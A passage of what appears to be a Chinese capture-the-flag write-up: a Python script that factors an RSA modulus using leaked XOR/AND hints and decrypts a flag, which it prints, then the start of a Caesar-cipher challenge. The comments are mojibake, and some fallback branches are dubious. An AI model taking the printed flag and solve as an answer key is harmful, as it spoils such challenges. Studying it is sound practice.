</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999</span>
</span></span><span class="line"><span class="cl"><span class="n">gift</span> <span class="o">=</span> <span class="mi">5160856643507450510397828582001051679762426399445648048700295372044216322163410374903665868763924707209143638999442462398781974627158916257502760763419216</span>
</span></span><span class="line"><span class="cl"><span class="n">gift1</span> <span class="o">=</span> <span class="mi">10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429</span>
</span></span><span class="line"><span class="cl"><span class="n">gift2</span> <span class="o">=</span> <span class="mi">2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_pq</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    å·²éªŒè¯çš„ p å’Œ q æ¢å¤å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="s2">    ä½¿ç”¨å›æº¯æ–¹æ³•å¤„ç†å¤šä¸ªå€™é€‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä»æœ€ä½ä½å¼€å§‹ï¼ˆp å’Œ q éƒ½æ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥æœ€ä½ä½ä¸º 1ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å­˜å‚¨æ‰€æœ‰å¯èƒ½çš„å€™é€‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">candidates</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è®¡ç®—éœ€è¦æ¢å¤çš„ä½æ•°ï¼ˆå¤šç•™ä¸€äº›ä½ä»¥é˜²è¿›ä½ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">num_bits</span> <span class="o">=</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_candidates</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span>  <span class="c1"># ç”¨äºè·å–ä½ i+1 ä½</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">p_so_far</span><span class="p">,</span> <span class="n">q_so_far</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># å°è¯• p çš„ç¬¬ i ä½</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">p_i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æ ¹æ®å¼‚æˆ–å…³ç³»è®¡ç®— q çš„ç¬¬ i ä½</span>
</span></span><span class="line"><span class="cl">                <span class="n">q_i</span> <span class="o">=</span> <span class="n">p_i</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="c1"># æ„å»ºæ–°å€™é€‰</span>
</span></span><span class="line"><span class="cl">                <span class="n">p_candidate</span> <span class="o">=</span> <span class="n">p_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">p_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">q_candidate</span> <span class="o">=</span> <span class="n">q_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">q_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="c1"># æ£€æŸ¥ä¹˜ç§¯çš„ä½ i+1 ä½æ˜¯å¦åŒ¹é…</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span> <span class="o">==</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">new_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰å€™é€‰ï¼Œå°è¯•æ”¾å®½æ¡ä»¶ï¼ˆè€ƒè™‘è¿›ä½è¯¯å·®ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">new_candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">p_so_far</span><span class="p">,</span> <span class="n">q_so_far</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">p_i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">q_i</span> <span class="o">=</span> <span class="n">p_i</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">p_candidate</span> <span class="o">=</span> <span class="n">p_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">p_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">q_candidate</span> <span class="o">=</span> <span class="n">q_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">q_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="c1"># æ£€æŸ¥ä¹˜ç§¯çš„ä½ i+1 ä½ï¼ˆå…è®¸å¾®å°è¯¯å·®ï¼‰</span>
</span></span><span class="line"><span class="cl">                    <span class="n">product_low</span> <span class="o">=</span> <span class="p">(</span><span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">                    <span class="n">n_low</span> <span class="o">=</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="c1"># å¦‚æœå·®å€¼å¾ˆå°ï¼Œå¯èƒ½æ˜¯è¿›ä½é—®é¢˜</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">product_low</span> <span class="o">-</span> <span class="n">n_low</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">                        <span class="n">new_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœä»ç„¶æ²¡æœ‰å€™é€‰ï¼Œå°è¯•å›æº¯ï¼ˆæ£€æŸ¥æ›´é•¿çš„è¿›ä½ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">new_candidates</span> <span class="ow">and</span> <span class="n">candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p_so_far</span><span class="p">,</span> <span class="n">q_so_far</span> <span class="o">=</span> <span class="n">candidates</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># å–æœ€åä¸€ä¸ªå€™é€‰</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">p_i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="n">q_i</span> <span class="o">=</span> <span class="n">p_i</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">p_candidate</span> <span class="o">=</span> <span class="n">p_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">p_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">q_candidate</span> <span class="o">=</span> <span class="n">q_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">q_i</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="c1"># è®¡ç®—å®Œæ•´ä¹˜ç§¯ï¼ˆä½¿ç”¨ gmpy2 é«˜ç²¾åº¦ï¼‰</span>
</span></span><span class="line"><span class="cl">                <span class="n">product</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">f_mod</span><span class="p">(</span><span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span><span class="p">,</span> <span class="n">mask</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">product</span> <span class="o">==</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">new_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°æœ‰æ•ˆå€™é€‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">new_candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># å¦‚æœæ¥è¿‘ç»“æŸï¼Œå°è¯•ä½¿ç”¨äºŒæ¬¡æ–¹ç¨‹</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">10</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">s</span> <span class="o">=</span> <span class="n">y</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">p_so_far</span> <span class="o">&amp;</span> <span class="n">q_so_far</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">s</span><span class="o">*</span><span class="n">s</span> <span class="o">-</span> <span class="mi">4</span><span class="o">*</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">p_candidate</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">                <span class="n">q_candidate</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span> <span class="o">-</span> <span class="n">d</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span> <span class="o">==</span> <span class="n">n</span> <span class="ow">and</span> <span class="p">(</span><span class="n">p_candidate</span> <span class="o">^</span> <span class="n">q_candidate</span><span class="p">)</span> <span class="o">==</span> <span class="n">y</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p_candidate</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">q_candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æ— æ³•åœ¨ç¬¬ </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> ä½æ¢å¤ p å’Œ q&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¿ç•™æ‰€æœ‰å€™é€‰ï¼ˆé¿å…è¿‡æ—©å‰ªæï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="n">candidates</span> <span class="o">=</span> <span class="n">new_candidates</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœåªæœ‰ä¸€ä¸ªå€™é€‰ä¸”æ»¡è¶³æ¡ä»¶ï¼Œå¯ä»¥æå‰è¿”å›</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span> <span class="o">=</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span> <span class="o">==</span> <span class="n">n</span> <span class="ow">and</span> <span class="p">(</span><span class="n">p_candidate</span> <span class="o">^</span> <span class="n">q_candidate</span><span class="p">)</span> <span class="o">==</span> <span class="n">y</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p_candidate</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">q_candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€ä½³å€™é€‰</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span> <span class="o">==</span> <span class="n">n</span> <span class="ow">and</span> <span class="p">(</span><span class="n">p_candidate</span> <span class="o">^</span> <span class="n">q_candidate</span><span class="p">)</span> <span class="o">==</span> <span class="n">y</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p_candidate</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">q_candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœæ²¡æœ‰å®Œå…¨åŒ¹é…ï¼Œé€‰æ‹©æœ€æ¥è¿‘çš„</span>
</span></span><span class="line"><span class="cl">    <span class="n">best_candidate</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">min_diff</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="s1">&#39;inf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">diff</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">p_candidate</span> <span class="o">*</span> <span class="n">q_candidate</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">diff</span> <span class="o">&lt;</span> <span class="n">min_diff</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">min_diff</span> <span class="o">=</span> <span class="n">diff</span>
</span></span><span class="line"><span class="cl">            <span class="n">best_candidate</span> <span class="o">=</span> <span class="p">(</span><span class="n">p_candidate</span><span class="p">,</span> <span class="n">q_candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">best_candidate</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">best_candidate</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># éªŒè¯å¼‚æˆ–å…³ç³»</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">^</span> <span class="n">q</span><span class="p">)</span> <span class="o">==</span> <span class="n">y</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;æ— æ³•æ¢å¤æœ‰æ•ˆçš„ p å’Œ q&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¢å¤ p å’Œ q</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">recover_pq</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">gift</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;p = </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;q = </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ p*q == n: </span><span class="si">{</span><span class="n">p</span><span class="o">*</span><span class="n">q</span> <span class="o">==</span> <span class="n">n</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ p^q == gift: </span><span class="si">{</span><span class="n">p</span><span class="o">^</span><span class="n">q</span> <span class="o">==</span> <span class="n">gift</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¢å¤ s å’Œ r</span>
</span></span><span class="line"><span class="cl"><span class="n">sr</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="n">n</span>  <span class="c1"># s * r</span>
</span></span><span class="line"><span class="cl"><span class="n">s_plus_r</span> <span class="o">=</span> <span class="n">gift2</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">gift1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è§£äºŒæ¬¡æ–¹ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="n">D</span> <span class="o">=</span> <span class="n">s_plus_r</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">sr</span>
</span></span><span class="line"><span class="cl"><span class="n">rootD</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rootD</span> <span class="o">*</span> <span class="n">rootD</span> <span class="o">!=</span> <span class="n">D</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°è¯•å¾®è°ƒï¼ˆå¤„ç†æµ®ç‚¹è¯¯å·®ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">adjust</span> <span class="ow">in</span> <span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rootD</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">D</span> <span class="o">+</span> <span class="n">adjust</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rootD</span> <span class="o">*</span> <span class="n">rootD</span> <span class="o">==</span> <span class="n">D</span> <span class="o">+</span> <span class="n">adjust</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;æ— æ³•æ‰¾åˆ° D çš„æ•´æ•°å¹³æ–¹æ ¹&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">s_plus_r</span> <span class="o">+</span> <span class="n">rootD</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">s_plus_r</span> <span class="o">-</span> <span class="n">rootD</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;s = </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;r = </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ s*r == sr: </span><span class="si">{</span><span class="n">s</span><span class="o">*</span><span class="n">r</span> <span class="o">==</span> <span class="n">sr</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ s&amp;r == gift1: </span><span class="si">{</span><span class="n">s</span><span class="o">&amp;</span><span class="n">r</span> <span class="o">==</span> <span class="n">gift1</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ s^r == gift2: </span><span class="si">{</span><span class="n">s</span><span class="o">^</span><span class="n">r</span> <span class="o">==</span> <span class="n">gift2</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®— phi(N)</span>
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">r</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è§£å¯†</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå¯å¾—syc{we1c0me_t190_ge1k_your_code_is_v1ey_de1psrc!}</p>
<h3 id="30caesar-slot-machine">30.Caesar Slot Machine
</h3><p>å…·ä½“è§£å¯†æ­¥éª¤</p>
<p>è§£å¯†å‡¯æ’’å¯†æ–‡ï¼šå°è¯•ç§»ä½ 1-25ï¼Œæ‰¾åˆ°èƒ½è¿˜åŸå‡º A: ã€B: ã€P: çš„æ˜æ–‡ï¼Œæå– aã€bã€Pã€‚
è®¡ç®—ä¸åŠ¨ç‚¹ xï¼š
è‹¥ a â‰  1ï¼šè®¡ç®— x = b * pow(1 - a, -1, P) % Pï¼ˆæ¨¡é€†å…ƒï¼‰ã€‚
è‹¥ a = 1ï¼šè‹¥ b = 0ï¼Œä»»æ„ x å‡å¯ï¼›å¦åˆ™æ— è§£ï¼ˆä½†é¢˜ç›®ä¸­æœåŠ¡å™¨å¯èƒ½ä¿è¯æœ‰è§£ï¼‰ã€‚
å‘é€ xï¼šå°†è®¡ç®—å¾—åˆ°çš„ x å‘é€ç»™æœåŠ¡å™¨ï¼Œé€šè¿‡æœ¬è½®éªŒè¯ã€‚
é‡å¤ 30 è½®ï¼šæ¯è½®é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œæœ€ç»ˆè·å– Flagã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
